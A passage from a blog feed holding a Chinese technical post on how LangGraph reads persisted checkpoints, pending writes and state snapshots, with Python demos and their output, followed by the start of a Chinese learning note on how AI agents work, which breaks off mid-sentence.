      "title": "[拆解LangChain执行引擎]持久化状态的提取",
      "link": "https://www.cnblogs.com/jaydenai/p/19623976/read-state",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/jaydenai/p/19623976/read-state\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 07:58\">\n    <span>[拆解LangChain执行引擎]持久化状态的提取</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        前面以`写入`的角度介绍了BaseCheckpointSaver的`put/aput`和`put_writes/aput_writes`方法,它们分别实现了基于Checkpoint和Pending Write的持久化。对于一个已经完成的Superstep来说，对应 Checkpoint就代表了它的状态；但是对于一个因中断尚未完成的Superstep，某个时刻的状态由上一Superstep的Checkpoint和当前Superstep的所有Pending Write来描述。如果真的需要恢复到中断时的状态，需要在Checkpoint固化状态基础上按序重放所有的Pending Write（实际上只需要重放代表成功执行任务的Pending Write）就可以了。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>前面以<code>写入</code>的角度介绍了BaseCheckpointSaver的<code>put/aput</code>和<code>put_writes/aput_writes</code>方法,它们分别实现了基于Checkpoint和Pending Write的持久化。对于一个已经完成的Superstep来说，对应 Checkpoint就代表了它的状态；但是对于一个因中断尚未完成的Superstep，某个时刻的状态由上一Superstep的Checkpoint和当前Superstep的所有Pending Write来描述。如果真的需要恢复到中断时的状态，需要在Checkpoint固化状态基础上按序重放所有的Pending Write（实际上只需要重放代表成功执行任务的Pending Write）就可以了。</p>\n<h2 id=\"1-读取checkpoint和pinding-write\">1. 读取Checkpoint和Pinding Write</h2>\n<p>如下这个<code>CheckpointTuple</code>用来表示Checkpoint和Pending Write的结合体。除了这两个核心成员，它还包括当前的执行配置（config和parent_config）和元数据。具体的Pending Write由Task ID、Channel名称和写入数组组成的三元组PendingWrite表示。</p>\n<pre><code class=\"language-python\">class CheckpointTuple(NamedTuple):\n    config: RunnableConfig\n    checkpoint: Checkpoint\n    metadata: CheckpointMetadata\n    parent_config: RunnableConfig | None = None\n    pending_writes: list[PendingWrite] | None = None\nPendingWrite = tuple[str, str, Any]\n</code></pre>\n<p>BaseCheckpointSaver提供了用于读取CheckpointTuple的<code>get_tuple/aget_tuple</code>方法。作为参数的RunnableConfig对象需要提供Thread ID（必需）和Checkpoint 命名空间（可选）。如果没有提供Checkpoint ID，方法会返回最终的状态，如果尚未完成，得到的CheckpointTuple元组可能包含Pending Write。如果提供了Checkpoint ID, 只有在此ID对应最新的Checkpoint且后一Superstep尚未完成，返回的CheckpointTuple元组才有可能包含Pending Write。对于实现在BaseCheckpointSaver中的另一组方法<code>get/aget</code>，会在内部调用<code>get_tuple/aget_tuple</code>方法，并返回CheckpointTuple元组封装的Checkpoint对象。</p>\n<pre><code class=\"language-python\">class BaseCheckpointSaver(Generic[V]):    \n    def get(self, config: RunnableConfig) -&gt; Checkpoint | None\n    async def aget(self, config: RunnableConfig) -&gt; Checkpoint | None\n\n    def get_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n    async def aget_tuple(self, config: RunnableConfig) -&gt; CheckpointTuple | None\n\n    def list(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[CheckpointTuple]:\n    async def alist(\n        self,\n        config: RunnableConfig | None,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[CheckpointTuple]\n</code></pre>\n<p>对于InMemorySaver来说，它的get_tuple/aget_tuple方法会从RunnableConfig配置中提取Thread ID和Checkpoint命名空间，如果指定了Checkpoint ID，它们会利用这三个值从storage和blobs字典中提取相应数据组成返回的CheckpointTuple对象。如果没有指定Checkpoint ID，就选择最近的那一个Checkpoint的ID。</p>\n<p>BaseCheckpointSaver的alist方法会列出并检索与指定条件匹配的所有CheckpointTuple，这些元组构成了一段 “历史” 。该方法主要用于会话管理、审计历史轨迹以及状态回溯，它具有如下的参数：</p>\n<ul>\n<li>config：如果RunnableConfig如果提供了Thread ID，该方法将仅返回该特定线程下的Checkpoint。如果不提供，在某些实现中会列出所有线程的最新Checkpoint（取决于具体的实现逻辑）。</li>\n<li>filter：提供基于元数据的过滤功能，例如 {\"status\": \"completed”} ，这在需要筛选特定业务状态的Checkpoint时非常有用。</li>\n<li>before：以RunnableConfig对象的形式提供Checkpoint ID，返回在此 之前创建的记录。这对于实现 “时间旅行” 功能至关重要，允许你查看图执行历史中的旧版本。</li>\n<li>limit：用于限制返回数据的数量。</li>\n</ul>\n<p>我们通过如下的实例演示来进一步了解持久化。我们构建了一个由foo、bar1和bar2这三个Node组成的Pregel，启动的时候利用输入针对通道foo的写入驱动执行节点foo，后者完成后写入通道bar驱动节点bar1和bar2并行执行。三个Node的处理函数都是handle，它会将传入的Node名称写入一个BinaryOperatorAggregate类型Channel（nodes），由此确定成功执行的Node。如果调用handle函数将interrupt参数指定为True，它会通过抛出一个GraphInterrupt异常模拟一个中断。在我们的演示实例中，节点foo和bar2会执行成功，中断会发生在节点bar1上。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue, BinaryOperatorAggregate\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.errors import GraphInterrupt\nimport operator, json\n\ndef handle(node_name: str, interrupt: bool = False) -&gt; list[str]:\n    if interrupt:\n        raise GraphInterrupt(\"manual interrupt\")\n    return [node_name]\n\nfoo = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: handle(\"foo\"))\n    .write_to(nodes=lambda x: x, bar=lambda _: \"triggered by foo\")\n)\n\nbar1 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar1\", interrupt=True))\n    .write_to(\"nodes\")\n)\n\nbar2 = (\n    NodeBuilder()\n    .subscribe_to(\"bar\")\n    .do(lambda _: handle(\"bar2\", interrupt=False))\n    .write_to(\"nodes\")\n)\n\napp = Pregel(\n    nodes={\"foo\": foo, \"bar1\": bar1, \"bar2\": bar2},\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n        \"nodes\": BinaryOperatorAggregate(list, operator.add),\n    },\n    checkpointer=InMemorySaver(),\n    input_channels=[\"foo\"],\n    output_channels=[\"nodes\"],\n)\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke({\"foo\": \"triggered by user\"}, config=config)\nassert result[\"nodes\"] == [\"foo\", \"bar2\"]\n\n(config, checkpoint, metadata, parent_config, pending_writes) = (\n    app.checkpointer.get_tuple(config)\n)\nprint(f\"config:\\n{json.dumps(config, indent=4)}\")\nprint(f\"checkpoint:\\n{json.dumps(checkpoint, indent=4)}\")\nprint(f\"metadata:\\n{json.dumps(metadata, indent=4)}\")\nprint(f\"parent_config:\\n{json.dumps(parent_config, indent=4)}\")\nprint(f\"pending_writes:\\n{json.dumps(pending_writes, indent=4)}\")\n</code></pre>\n<p>我们为创建的Pregel对象提供了一个InMemorySaver作为它的Checkpointer，并在调用时利用提供的RunnableConfig设置了Thread ID。由于我们将通道nodes作为输出，所以调用结果会反映三个Node的执行状态（只有节点foo和bar2成功执行）。我们随后传入相同的配置调用Checkpointer的get_tuple方法，并将得到的CheckpointTuple元组进行拆包输出。</p>\n<pre><code class=\"language-json\">config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\"\n    }\n}\ncheckpoint:\n{\n    \"v\": 4,\n    \"ts\": \"2026-01-19T10:17:07.498064+00:00\",\n    \"id\": \"1f0f5200-24f1-6382-8000-bde4e02ab92b\",\n    \"channel_versions\": {\n        \"foo\": \"00000000000000000000000000000001.0.06769883673554666\",\n        \"nodes\": \"00000000000000000000000000000002.0.3174924500871408\",\n        \"bar\": \"00000000000000000000000000000002.0.3174924500871408\"\n    },\n    \"versions_seen\": {\n        \"__input__\": {},\n        \"foo\": {\n            \"foo\": \"00000000000000000000000000000001.0.06769883673554666\"\n        }\n    },\n    \"updated_channels\": [\n        \"bar\",\n        \"nodes\"\n    ],\n    \"channel_values\": {\n        \"foo\": \"triggered by user\",\n        \"nodes\": [\n            \"foo\"\n        ],\n        \"bar\": \"triggered by foo\"\n    }\n}\nmetadata:\n{\n    \"source\": \"loop\",\n    \"step\": 0,\n    \"parents\": {}\n}\nparent_config:\n{\n    \"configurable\": {\n        \"thread_id\": \"123\",\n        \"checkpoint_ns\": \"\",\n        \"checkpoint_id\": \"1f0f5200-24ee-671f-bfff-2e9f3ca91778\"\n    }\n}\npending_writes:\n[\n    [\n        \"30b17cb1-76f1-3c5a-0d32-33f544fcabdf\",\n        \"nodes\",\n        [\n            \"bar2\"\n        ]\n    ],\n    [\n        \"e126d089-c354-0ac8-bb9e-b12bbe3f20b8\",\n        \"__interrupt__\",\n        \"manual interrupt\"\n    ]\n]\n</code></pre>\n<p>整个执行过程涉及三个Superstep，会创建两个Checkpoint。第一个Checkpoint的创建发生在调用invoke方法的时候，此时提供的输入被写入Channel，首批待执行的Node（foo）准备就绪，此时创建的Checkpoint 记录了 <code>接收到了初始任务，但尚未开始执行任何Node</code> 的状态。此时对应的Superstep序号为-1，输出结果的parent_config部分提供了此Checkpoint的ID。</p>\n<p>第二个Checkpoint是为序号为0的Superstep创建的，此时节点foo成功执行，执行结果最终被输入目标Channel，创建的Checkpoint反映的就是的状态，config部分提供了此Checkpoint的ID。上面的输出还提供了这个Checkpoint的时间戳、Channel的版本和值、涉及Node的可见Channel（f和版本，以及涉及更新的Channel列表。</p>\n<p>由于最后一个Superstep（序号为1）没有完全结束，它们会利用对应的Pending Write来描述。上面输出的第一个Pending Write表示成功执行的节点bar针对通道nodes的写入，第二个针对特殊系统Channel <code>__interrupt__</code>的写入很明显就是因为节点bar1的中断导致。</p>\n<h2 id=\"2-读取状态快照\">2. 读取状态快照</h2>\n<p>BaseCheckpointSaver提供了get_tuple/aget_tuple方法以Checkpoint_Tuple的形式返回最新或者基于过去时间点的状态。对于CheckpointTuple这个五元组，除了Checkpoint和PendingWrite列表，还包括Checkpoint的元数据和相关配置。这个元组主要由执行引擎内部使用的，针对最终开发者来说可读性差点，所以Pregel类定义了如下所示的<code>get_state/aget_state</code>方法，它们提供的StateSnapshot类型更具可读性。</p>\n<pre><code class=\"language-python\">class Pregel(\n    PregelProtocol[StateT, ContextT, InputT, OutputT],\n    Generic[StateT, ContextT, InputT, OutputT]): \n\n    def get_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n    async def aget_state(\n        self, config: RunnableConfig, *, subgraphs: bool = False\n    ) -&gt; StateSnapshot\n\n    def get_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; Iterator[StateSnapshot]\n    async def aget_state_history(\n        self,\n        config: RunnableConfig,\n        *,\n        filter: dict[str, Any] | None = None,\n        before: RunnableConfig | None = None,\n        limit: int | None = None,\n    ) -&gt; AsyncIterator[StateSnapshot]\n</code></pre>\n<p>当我们调用Pregel对象的<code>get_state/aget_state</code>方法的时候，它会将指定的RunnableConfig对象作为参数调用Checkpointer的<code>get_tuple/aget_tuple</code>方法，并利用返回的Checkpoint_Tuple元组生成StateSnapshot对象。StateSnapshot的<code>values</code>字段提供的值来源于Checkpoint对象的channel_values字段，它的<code>metadata</code>字段表示的CheckpointMetadata 直接来源于Checkpoint_Tuple的同名字段，而<code>config</code>和<code>parent_config</code>返回的RunnableConfig则是由Checkpoint_Tuple同名字段于元数据合并而成。表示快照创建时间的<code>created_at</code>对应于Checkpoint_Tuple表示时间戳的ts字段，而interrupts返回的Interrupt列表是根据中断类型的PendingWrite构建的。</p>\n<pre><code class=\"language-python\">class StateSnapshot(NamedTuple):\n    values: dict[str, Any] | Any\n    next: tuple[str, ...]\n    config: RunnableConfig\n    metadata: CheckpointMetadata | None\n    created_at: str | None\n    parent_config: RunnableConfig | None\n    tasks: tuple[PregelTask, ...]\n    interrupts: tuple[Interrupt, ...]\n\nclass PregelTask(NamedTuple):\n    id: str\n    name: str\n    path: tuple[str | int | tuple, ...]\n    error: Exception | None = None\n    interrupts: tuple[Interrupt, ...] = ()\n    state: None | RunnableConfig | StateSnapshot = None\n    result: Any | None = None\n</code></pre>\n<p>StateSnapshot的<code>tasks</code>字段返回一组PregelTask对象，它们表示根据Checkpoint创建的待执行任务，<code>next</code>字段以元组的形式返回这些任务的Node名称。对于最新的Checkpoint，若下一个Superstep尚未完成，PregelTask的信息还会利用对应的Pending Write进一步完善。我们可以利用PregelTask对象得到每个任务的ID、Node名称、执行路径、抛出的异常和中断（根据异常和中断类型的PendingWrite创建），而<code>state</code>和<code>result</code>分别承载这任务的状态和输出结果。如果整个执行流程结束，自然就没有所谓后续任务的说法，此时StateSnapshot的tasks字段为空。</p>\n<p>除了返回一个具体的状态快照，Pregel类还定义了<code>get_state_history/aget_state_history</code>，它们的参数列表与BaseCheckpointSaver的<code>list/alist</code>方法完全一致。当这两个方法被调用的时候，Pregel会调用Checkpointer的<code>list/alist</code>方法，并将得到Checkpoint_Tuple元组转换成StateSnapshot对象。<code>get_state_history/aget_state_history</code>方法返回的迭代器以时间逆序的方式返回对应的状态快照。</p>\n<p>如下这个程序演示了一个具体的Pregel对象的历史由哪些快照组成，每个快照又反映当时的状态。我们构建的Pregel对象由四个Node组成，调用时指定通道foo会驱动执行节点foo，它执行结束后写入通道bar驱动bar1、bar2和bar3并行执行。除了bar1能够顺利执行外，我们为bar2设置了一个中断，让bar3抛出异常。</p>\n<pre><code class=\"language-python\">from langgraph.channels import LastValue\nfrom langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.checkpoint.memory import  InMemorySaver\nfrom langgraph.types import interrupt\n    \ndef handle(node_name: str, halt : bool, raise_error: bool) -&gt; None:\n    if halt:\n        _ = interrupt(f\"Manually be interrupted at {node_name}\")\n    if raise_error:\n        raise Exception(f\"Manually raised error at {node_name}\")\n\nfoo = (NodeBuilder()\n       .subscribe_to(\"foo\", read=False)\n       .do(lambda _: handle(\"foo\", halt=False, raise_error=False))\n       .write_to(bar = lambda _:None))\nbar1 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar1\", halt=False, raise_error=False)))\nbar2 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar2\", halt=True, raise_error=False)))\nbar3 = (NodeBuilder()\n        .subscribe_to(\"bar\", read=False)\n        .do(lambda _: handle(\"bar3\", halt=False, raise_error=True)))\napp = Pregel(\n    nodes={\n        \"foo\": foo,\n        \"bar1\": bar1,\n        \"bar2\": bar2,\n        \"bar3\": bar3\n    },\n    channels={\n        \"foo\": LastValue(str),\n        \"bar\": LastValue(str),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer= InMemorySaver())\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\n\ntry:\n    app.invoke(input={\"foo\": \"begin\"},config=config)\nexcept Exception as e:\n    pass\n\nfor snapshot in app.get_state_history(config):\n    print(f\"\"\"\nvalues: {snapshot.values}\nnext: {snapshot.next}\ninterrupts: {snapshot.interrupts}   \ntasks:\"\"\")\n    for task in snapshot.tasks:\n        print(f\"\"\"  id: {task.id}\n    name: {task.name}\n    path: {task.path}\n    error: {task.error} \n    interrupts: {task.interrupts}\n    state: {task.state}\n    result: {task.result}\"\"\")\n</code></pre>\n<p>在完成了针对Pregel对象的调用后，我们采用相同的配置调用它的<code>get_state_history</code>方法得到完整的历史，并将承载历史片段的StateSnapshot信息打印出来。整个过程涉及三个Superstep，前两个成功完成的Superstep会提供两个Checkpoint，第三个尚未完成的Superstep只提供针对三个Node任务的Pending Write。</p>\n<pre><code class=\"language-json\">values: {'start': 'begin', 'bar': None}\nnext: ('bar1', 'bar2', 'bar3')\ninterrupts: (Interrupt(value='Manually be interrupted at bar2', \n    id='26f309d618c42ff31d2b3404369232e4'),)\ntasks:\n  id: dbb24ec5-f1ba-f845-7351-54e88f34db0f\n    name: bar1\n    path: ('__pregel_pull', 'bar1')\n    error: None\n    interrupts: ()\n    state: None\n    result: {}\n  id: 794fffda-2e6c-0685-0d44-3ed6c57ca366\n    name: bar2\n    path: ('__pregel_pull', 'bar2')\n    error: None\n    interrupts: (Interrupt(value='Manually be interrupted at bar2', \n        id='26f309d618c42ff31d2b3404369232e4'),)\n    state: None\n    result: None\n  id: 1055ec55-49dc-0629-86b5-661a2614f349\n    name: bar3\n    path: ('__pregel_pull', 'bar3')\n    error: Exception('Manually raised error at bar3')\n    interrupts: ()\n    state: None\n    result: None\n\nvalues: {'start': 'begin'}\nnext: ('foo',)\ninterrupts: ()\ntasks:\n  id: 88904475-3edc-733a-d84d-98aa6d3f5e80\n    name: foo\n    path: ('__pregel_pull', 'foo')\n    error: None\n    interrupts: ()\n    state: None\n    result: {'bar': None}\n</code></pre>\n<h2 id=\"3任务路径\">3.任务路径</h2>\n<p>还记得我们前面说个任务的两种创建方式，一种是站在Node的角度，通过查看订阅Channel的更新状态确定是否应该执行，我们称这种任务创建模式为<code>Pull模式</code>。与之相对的则是<code>Push模式</code>，Node利用写入<code>__pregel_tasks</code>这个特殊Channel的Send对象决定后续执行的Node，执行引擎会从此Channel读取Send对象的来创建对应的任务。任务路径的第一部分通常就反映了任务的驱动模式，对应的值为<code>__pregel_pull</code>和<code>__pregel_push</code>。</p>\n<p>由于前面演示的都是基于Channel订阅驱动的任务，所以路径采用(“__pregel_pull”,{node})的形式。如下的程序演示“Push任务”的路径，我们构建的Pregel由四个Node（foo、bar1、bar2和bar3）组成，节点foo的处理函数最终会生成三个针对其他Node的Send对象，并写入“__pregel_tasks”Channel以驱动它们并行执行。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.pregel._read import PregelNode\nfrom langgraph.pregel._write import ChannelWrite, ChannelWriteTupleEntry\nfrom langgraph.types import Send\nfrom langgraph.checkpoint.memory import InMemorySaver\n\nentry = ChannelWriteTupleEntry(lambda args: [(\"__pregel_tasks\", args)])\nwriter = ChannelWrite(writes=[entry])\nfoo: PregelNode = (\n    NodeBuilder()\n    .subscribe_to(\"foo\")\n    .do(lambda _: [Send(node=node, arg=\"foo\") for node in [\"bar1\", \"bar2\", \"bar3\"]])\n).build()\nfoo.writers.append(writer)\n\nbars = {name: NodeBuilder() for name in [\"bar1\", \"bar2\", \"bar3\"]}\n\napp = Pregel(\n    nodes={\"foo\": foo, **bars},\n    channels={\n        \"foo\": LastValue(None),\n    },\n    input_channels=[\"foo\"],\n    output_channels=[],\n    checkpointer=InMemorySaver(),\n)\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\nresult = app.invoke(input={\"foo\": None}, config=config, interrupt_before=\"bar2\")\nsnapshot = app.get_state(config)\nfor task in snapshot.tasks:\n    print(f\"{task.name}:{task.path}\")\n</code></pre>\n<p>为了能看到三个任务，我们在在最后一个Superstep中产生一个中断，为此我们在调用的时候通过指定<code>interrupt_before</code>参数在执行节点bar2前中断。我们随后调用Pregel的get_state方法得到描述最终状态的StateSnapshot，并输出所有任务的执行路径。从如下的输出可以看出，由于是三个基于Push模式的任务，所以组成路径的第一个部分内容为 <code>__pregel_push</code> 。每个任务由 <code>__pregel_tasks</code> Channel的Send对象构建而成，第二部分的数组代表对应的Send对象在Channel中的索引。由于整个程序只有唯一的Pregel对象，不设置子图调用，所以第三部分返回False。</p>\n<pre><code>bar1:('__pregel_push', 0, False)\nbar2:('__pregel_push', 1, False)\nbar3:('__pregel_push', 2, False)\n</code></pre>\n<h2 id=\"4状态嵌套\">4.状态嵌套</h2>\n<p>这里我们有必要提一下PregelTask类的<code>state</code>字段。从给出的定义可以看出，它可以返回一个RunnableConfig配置，也可以返回一个StateSnapshot对象。如果任务涉及子图的调用，并且在调用get_state/aget_state方法时将subgraphs参数设置为True，它的state字段就会返回一个描述子图当前状态的<code>StateSnapshot</code>对象。借助于反映执行链路和调用顺序的Checkpoint命名空间，就可以形成的嵌套层次结构（state =&gt;task=&gt;state）使我们可以可以看到一个任务完整的调用链条。</p>\n<p><img alt=\"Alternative Text\" class=\"lazyload\" /></p>\n<p>以如下这个验证程序为例。我们构建了两个具有单一Node的Pregel对象app和sub_graph，前者的节点main_node以子图调用的方式调用sub_graph，后者的Node命名为 “sub_node”。为了在StateSnapshot中将任务保留下来，我们在两个Node中引入了中断。</p>\n<pre><code class=\"language-python\">from langgraph.pregel import Pregel, NodeBuilder\nfrom langgraph.channels import LastValue\nfrom langgraph.checkpoint.memory import InMemorySaver\nfrom langgraph.types import interrupt\nfrom typing import Any\nfrom langgraph.types import StateSnapshot\n\nsub_node = (NodeBuilder()\n    .subscribe_to(\"start\")\n    .do(lambda _: interrupt(\"manual interrupt\"))\n)\nsub_graph = Pregel(\n    nodes={\"sub_node\": sub_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n)\n\ndef handle(args: dict[str, Any]) -&gt; None:\n    sub_graph.invoke(input={\"start\": \"begin\"})\n    interrupt(\"main graph interrupt\")\n\nmain_node = NodeBuilder().subscribe_to(\"start\").do(handle)\napp = Pregel(\n    nodes={\"main_node\": main_node},\n    channels={\"start\": LastValue(str)},\n    input_channels=[\"start\"],\n    output_channels=[],\n    checkpointer=InMemorySaver())\n\nconfig = {\"configurable\": {\"thread_id\": \"123\"}}\napp.invoke(input={\"start\": \"begin\"}, config=config)\nsnapshot = app.get_state(config, subgraphs=True)\n\nindent = -1\ndef print_snapshot(snapshot: StateSnapshot) -&gt; None:\n    global indent\n    indent += 1\n    config = snapshot.config[\"configurable\"]\n    print(f\"{'  ' * indent}checkpoint_ns: {config.get('checkpoint_ns', None)}\")\n    for task in snapshot.tasks:\n        print(f\"{'  ' * indent}task: {task.name}:{task.id}\")\n        if sub_snapshot := task.state:\n            print_snapshot(sub_snapshot)\n\nprint_snapshot(snapshot)\n</code></pre>\n<p>在完成调用后，我们调用作为主图的Pregel对象的<code>get_state</code>方法，并将参数subgraphs设置为True。我们调用print_snapshot函数输出StateSnapshot提供的Checkpoint命名空间和任务的名称与ID。如果描述任务的PregelTask对象的state字段也是一个StateSnapshot对象，那么继续递归调用此函数。从如下的输出可以看出，作为子图的Pregel将当前任务的名称和ID的组合作为Checkpoint命名空间，这样的结构确保了 “主图” 恢复的时候能够精准地加载 “子图” 的状态。</p>\n<pre><code>checkpoint_ns: \ntask: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    checkpoint_ns: main_node:9f7c900b-0d56-927c-17fb-5d519cc85678\n    task: sub_node:a483bfb8-bcc6-92b3-2f64-9f9e9f4fe158\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 07:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jaydenai\">JaydenAI</a>&nbsp;\n阅读(<span id=\"post_view_count\">9</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "AI 学习笔记：Agent 的基础应用",
      "link": "https://www.cnblogs.com/owlman/p/19623216",
      "published": "",
      "description": "<h2 class=\"post-title\">\n            <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/owlman/p/19623216\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 16:09\">\n    <span>AI 学习笔记：Agent 的基础应用</span>\n    \n\n</a>\n\n        </h2>\n        <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>[!NOTE] 笔记说明</p>\n<p>这篇笔记对应的是《[[关于 AI 的学习路线图]]》一文中所规划的第四个学习阶段。其中记录了我学习 AI Agent 的工作原理，并将其应用于实际工作场景的全过程，以及在该过程中所获得的心得体会。同样的，这些内容也将成为我 AI 系列笔记的一部分，被存储在本人 Github 上的<a href=\"https://github.com/owlman/CS_StudyNotes\" rel=\"noopener nofollow\" target=\"_blank\">计算机学习笔记库</a>中，并予以长期维护。</p>\n</blockquote>\n<h2 id=\"ai-agent-简介\">AI Agent 简介</h2>\n<p>在理解了 LLM 在生产环境中所扮演的角色之后，初学者们接下来要思考的问题是：如何让它参与到自己的实际工作中？到目前为止（截至 2026 年 2 月），这个问题最具可行性的解决方案是：构建并使用 AI Agent。</p>\n<h3 id=\"为什么需要-ai-agent\">为什么需要 AI Agent</h3>\n<p>在早期，大多数用户是通过 Web 端或移动端的即时通信应用，主要以文本聊天的方式来使用 LLM 的（例如 ChatGPT、豆包等）。这类应用本质上是基于 HTTP API 构建的人机交互界面，其主要交互模式是“输入文本—生成文本”的往返过程。我们之前在《[[LLM 的部署与测试]]》一文中基于 PyTest 框架编写的测试用例，实际上模拟的就是这种交互模式。</p>\n<p>尽管，这类应用极大地降低了 LLM 的使用门槛，使其成为了一种能惠及普通用户的智能问答工具，但 AI 所能带来的生产力也在很大程度上被局限在了这种即时通信式的交互模式中。因为在这种交互模式下，LLM 只能根据用户当前的输入来生成文本结果，无法主动访问本地环境、调用系统资源或执行实际任务。更重要的是，LLM 在这种模式下并不处于一个持续运行的控制结构之中，它只在收到请求时做出一次性响应，无法负责具体的工作流程与状态管理。</p>\n<p>试想一下，如果 LLM 已经具备了复杂的任务规划与执行能力，我们却把它限制在聊天窗口中，这岂不是太浪费了？正是为了避免这种浪费，并赋予 LLM 在特定环境中“执行操作”的能力，AI 的研究者们重新审视了 AI Agent 这一在 20 世纪 80-90 年代就已经形成体系的概念，并在工程实践领域给了它全新的实现形式。</p>\n<p>关于 AI Agent 这个概念，读者可以参考我之前在《[[关于 AI 的学习路线图]]》中推荐的《人工智能：现代方法》一书给出的定义，原文如下：</p>\n<blockquote>\n<p>An agent is anything that can perceive its environment through sensors and act upon that environment through actuators.</p>\n<p>翻译过来就是：</p>\n<p>任何能够通过传感器感知环境，并通过执行器对环境产生影响的实体，都可以称为 Agent。</p>\n</blockquote>\n<p>这个定义成为了后来所有 AI Agent 应用的理论基础。由此也可以看出，AI Agent 的核心功能并不是提升 LLM 本身的智能水平，而是赋予它与外部系统交互的能力，使其能够参与到真实的工作流程之中。从本质上来说，这其实是 AI 应用在客户端方面的一次角色转变，它现在从单纯的答题工具被转变成了一个可以参与任务执行的系统组件。在特定的应用场景中，这种架构上的转变为工作流程的自动化提供了可行的工程路径。</p>\n<h3 id=\"ai-agent-的工作原理\">AI Agent 的工作原理</h3>\n<p>下面，让我们来了解一下 AI Agent 具体是怎么工作的。在传统聊天式的 AI 应用中，我们可以将其基本的执行模式简单概括为：</p>\n<blockquote>\n<p>用户输入 → 模型推理 → 输出结果 → 结束</p>\n</blockquote>\n<p>这种执行模式本质上是一次性的请求—响应（request-response）结构。即在这种执行模式下，LLM 会在接收到用户输入后生成文本，然后就立即退出当前工作流程，不再参与后续状态管理了。AI Agent 与这类应用的核心差异就在于：它在执行模式中引入了一个可持续运行的控制循环（control loop）。这种循环结构将 LLM 从被动接收用户输入的文本生成器，转变成了用于驱动整个程序执行结构的决策组件。换言之，Agent 的存在将 AI 应用的基本执行模式从“请求—响应”转变成了下面这样一个“感知—决策—执行”的循环结构：</p>\n<blockquote>\n<p>感知环境 → 生成决策 → 执行动作 → 更新环境状态 → 再次感知</p>\n</blockquote>\n<p>这个循环结构会持续运行下去，直到任务完成或满足终止条件。从该执行模式可以看出，一个典型的 AI Agent 应用通常包含以下几个核心组件：</p>\n<ul>\n<li><strong>LLM</strong>：该组件负责理解当前任务目标、分析上下文状态并生成下一步行动决策，不负责直接执行外部操作；</li>\n<li><strong>工具接口</strong>：该组件负责将 LLM 生成的结构化指令转换为实际可执行的操作，例如：调用 API、访问数据库、读写文件、执行系统命令、触发外部服务等。它们通常由开发者定义，并通过函数调用或插件机制暴露给模型；</li>\n<li><strong>状态管理</strong>：该组件负责维护任务的中间状态，例如：当前任务进度、已执行步骤、外部环境变化、历史决策记录等。这些状态通常会被存储在内存变量、数据库、向量存储、文件系统等介质中，如果缺乏有效的状态管理机制，我们就难以构建一个真正的 Agent 应用；</li>\n<li><strong>控制器</strong>：该组件负责驱动循环、判断是否继续执行、解析模型输出、调用对应工具、处理异常与失败重试。从架构角度来看，控制器可被视为 Agent 系统的“骨架”，而 LLM 只是其中的决策模块。</li>\n</ul>\n<p>基于以上核心组件，我们就可以简单地归纳出一个 Agent 应用的工作流程，其主要步骤如下：</p>\n<ol>\n<li>接收任务目标</li>\n<li>将目标与当前状态输入 LLM</li>\n<li>LLM 输出下一步行动计划（通常为结构化格式）</li>\n<li>控制器解析输出</li>\n<li>调用相应工具执行</li>\n<li>更新状态</li>\n<li>判断是否完成任务</li>\n<li>若未完成，则进入下一轮循环</li>\n</ol>\n<p>从工程角度来看，AI Agent 是一种新的系统架构模式，它通过持续运行的控制循环，使模型能够参与真实任务的执行过程，而不仅仅是生成文本结果。</p>\n<h2 id=\"ai-agent-的使用方法\">AI Agent 的使用方法</h2>\n<p>在了解了使用 AI Agent 的必要性及其工作原理之后，接下来就可以正式开始研究如何将它运用到自己的日常工作中了。而当我们要讨论 AI Agent 